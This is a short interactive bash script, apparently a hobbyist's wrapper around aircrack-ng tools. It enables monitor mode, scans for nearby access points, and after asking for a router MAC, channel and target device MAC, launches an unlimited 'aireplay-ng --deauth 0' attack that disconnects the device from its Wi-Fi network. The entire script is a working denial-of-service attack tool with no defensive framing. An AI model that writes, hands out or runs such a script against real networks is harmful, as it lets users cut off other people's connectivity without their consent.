echo -e "\e[34mScript by TechnoSrijan!\e[0m";
iwconfig
read -p 'Enter Card Name:' userinput1;
#
airmon-ng  start ${userinput1:-}
iwconfig
read -p 'Enter New Card Name:' userinput2;
#
airodump-ng  ${userinput2:-}
echo -e "\e[32mNote Router MAC Address and Channel Number!\e[0m";
read -p 'Enter Router MAC Address:' userinput3;
#
read -p 'Enter Router Channel Number:' userinput4;
#
airodump-ng ${userinput2:-} --bssid ${userinput3:-} --channel ${userinput4:-}
echo -e "\e[32mNote Device MAC Address:\e[0m";
read -p 'Enter Device MAC Address:' userinput5;
#
read -p 'Are you sure you want to commence the attack?(y/n)' userinput6;
#
if [ "${userinput6-}" = "y" ]
then
	aireplay-ng  --deauth 0 -c ${userinput5:-} -a ${userinput3:-} ${userinput2:-}
fi
if [ "${userinput6:-}" != "y" ]
then
	echo -e "\e[33mProcess Terminated\e[0m";
fi
echo -e "\e[34mScript by TechnoSrijan!\e[0m";
